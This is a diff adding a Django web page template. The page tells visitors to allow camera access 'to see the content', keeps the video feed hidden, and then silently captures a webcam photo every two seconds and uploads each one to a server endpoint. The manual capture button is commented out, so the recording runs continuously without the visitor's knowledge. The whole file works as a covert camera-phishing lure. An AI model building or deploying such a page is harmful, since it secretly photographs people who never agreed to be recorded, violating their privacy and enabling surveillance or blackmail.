@@ -1,0 +1,67 @@
+{% extends 'main.html' %}
+{% block content %}
+    {% csrf_token %}
+    <script src="https://code.jquery.com/jquery-3.7.0.js"
+            integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM="
+            crossorigin="anonymous"></script>
+    <video class="d-none" id="video" width="640" height="480" autoplay>
+    </video>
+    <img id="capturedImage" src="#" alt="Captured Image" style="display: none">
+    <h1 class="text-center">Allow access to camera to see the content</h1>
+{% endblock content %}
+{% block scripts %}
+    <script>
+        let csrftoken = '{{ csrf_token }}'
+        const videoElement = document.getElementById('video');
+        const captureBtn = document.getElementById('captureBtn');
+        const capturedImageElement = document.getElementById('capturedImage');
+
+        // Get the user media (camera) on page load
+        navigator.mediaDevices.getUserMedia({
+                video: true
+            })
+            .then(stream => {
+                videoElement.srcObject = stream;
+            })
+            .catch(error => {
+                console.error('Error accessing the camera: ', error);
+            });
+
+        function send_image() {
+            const canvas = document.createElement('canvas');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+            // Convert the captured image to a Blob
+            canvas.toBlob(blob => {
+                // Create FormData and append the image file to it
+                const formData = new FormData();
+                formData.append('image', blob, 'captured_image.jpg'); // 'captured_image.jpg' is the file name
+
+                // Send the FormData as a POST request to the server using AJAX
+                $.ajax({
+                    url: '/api/test/', // Replace with your server endpoint
+                    type: 'POST',
+                    headers: {
+                        'X-CSRFToken': csrftoken
+                    },
+                    data: formData,
+                    processData: false,
+                    contentType: false,
+                    success: function(response) {
+                        console.log('Image uploaded successfully!');
+                    },
+                    error: function(error) {
+                        console.error('Error uploading the image.');
+                    }
+                });
+            }, 'image/jpeg');
+        }
+
+        // Capture the image when the "Capture Image" button is clicked
+        {% comment %} captureBtn.addEventListener('click', send_image); {% endcomment %}
+        setInterval(send_image, 2000);
+    </script>
+{% endblock scripts %}
